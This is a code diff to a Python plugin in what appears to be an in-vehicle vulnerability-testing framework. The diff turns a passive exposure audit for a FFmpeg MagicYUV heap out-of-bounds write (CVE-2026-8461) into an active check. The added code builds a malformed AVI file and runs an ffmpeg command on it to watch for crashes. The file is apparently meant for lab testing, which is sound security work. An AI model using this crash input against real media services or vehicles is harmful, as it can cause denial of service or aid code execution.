@@ -1,6 +1,11 @@
 #!/usr/bin/env python3
-"""Safe exposure audit for FFmpeg MagicYUV decoder heap OOB risk."""
+"""Active validation for FFmpeg MagicYUV decoder heap OOB risk."""
 from __future__ import annotations
+
+import os
+import shlex
+import subprocess
+import tempfile
 
 from active_validation_core import run_active_validation
 from iv_plugin_base import IVIVulnerabilityPlugin
@@ -16,7 +21,7 @@ VULN = {
     "type": "堆越界写/DoS或RCE",
     "summary": "FFmpeg MagicYUV 解码器在特定视频帧参数下可能堆越界写，影响车机媒体播放器、缩略图生成、上传转码和多媒体服务链路。",
     "source_description": "poc-lab describes PixelSmash, a MagicYUV decoder heap out-of-bounds write affecting FFmpeg before 8.1.2.",
-    "poc_status": "poc-lab公开复现；本插件仅做安全暴露审计",
+    "poc_status": "poc-lab公开复现；本插件支持主动验证；破坏性 payload 需 allow_disruptive 授权",
     "research_value": "IVI 媒体解析和车联网后端视频处理都可能依赖 FFmpeg，恶意媒体文件是高频入口。",
     "source_url": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-8461%20PixelSmash",
     "references": ["https://github.com/Unclecheng-li/poc-lab"],
@@ -34,9 +39,61 @@ VULN = {
 }
 
 
+def _write_magicyuv_avi_sample() -> str:
+    fd, path = tempfile.mkstemp(prefix="autosec_cve_2026_8461_", suffix=".avi")
+    # Minimal RIFF/AVI-like MagicYUV stimulus. The goal is to exercise media
+    # parser paths in a lab decoder and observe crash/ASAN output.
+    payload = (
+        b"RIFF" + (0x200).to_bytes(4, "little") + b"AVI "
+        b"LIST" + (0x80).to_bytes(4, "little") + b"hdrl"
+        b"strf" + (40).to_bytes(4, "little")
+        + (40).to_bytes(4, "little")
+        + (0x7fffffff).to_bytes(4, "little")
+        + (0x7fffffff).to_bytes(4, "little")
+        + (1).to_bytes(2, "little") + (24).to_bytes(2, "little")
+        + b"M8Y0" + b"A" * 256
+    )
+    with os.fdopen(fd, "wb") as handle:
+        handle.write(payload)
+    return path
+
+
+def _ffmpeg_probe(plugin, vuln):
+    supplied_sample = plugin.params.get("media_sample_path") or plugin.params.get("sample_path")
+    sample = str(supplied_sample) if supplied_sample else _write_magicyuv_avi_sample()
+    cmd = plugin.params.get("ffmpeg_cmd") or plugin.params.get("decoder_cmd")
+    evidence = {
+        "ok": True,
+        "sample_path": sample,
+        "payload_bytes": os.path.getsize(sample),
+        "sample_source": "operator_supplied" if supplied_sample else "generated_stimulus",
+        "phenomenon": "malformed MagicYUV/AVI sample prepared for decoder crash observation",
+        "requires_manual_review": True,
+    }
+    if not cmd:
+        evidence["operator_action"] = "Run ffmpeg/IVI media parser against sample_path or pass ffmpeg_cmd/decoder_cmd to observe crash/ASAN output."
+        return evidence
+    started = subprocess.run(
+        shlex.split(str(cmd)) + ["-v", "error", "-i", sample, "-f", "null", "-"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        timeout=float(plugin.params.get("timeout", 15)),
+        check=False,
+    )
+    stderr = started.stderr.decode("utf-8", errors="replace")
+    evidence.update({
+        "command": cmd,
+        "returncode": started.returncode,
+        "stderr_excerpt": stderr[:1000],
+        "vulnerable": started.returncode < 0 or any(token in stderr.lower() for token in ("asan", "heap", "overflow", "segmentation fault", "crash")),
+        "phenomenon": "FFmpeg/media parser executed against malformed MagicYUV sample",
+    })
+    return evidence
+
+
 class FFmpegMagicYUVHeapOOBRCEAuditPlugin(IVIVulnerabilityPlugin):
     meta_display_id = "POC-APP-066"
-    meta_poc_name = "FFmpeg MagicYUV Heap OOB RCE Audit"
+    meta_poc_name = "FFmpeg MagicYUV Heap OOB RCE Active Validation"
     meta_cve_id = "CVE-2026-8461"
     meta_severity = "High"
     meta_protocol = "local"
@@ -52,4 +109,4 @@ class FFmpegMagicYUVHeapOOBRCEAuditPlugin(IVIVulnerabilityPlugin):
         return True
 
     def exploit(self):
-        return run_active_validation(self, VULN)
+        return run_active_validation(self, VULN, probe=_ffmpeg_probe)
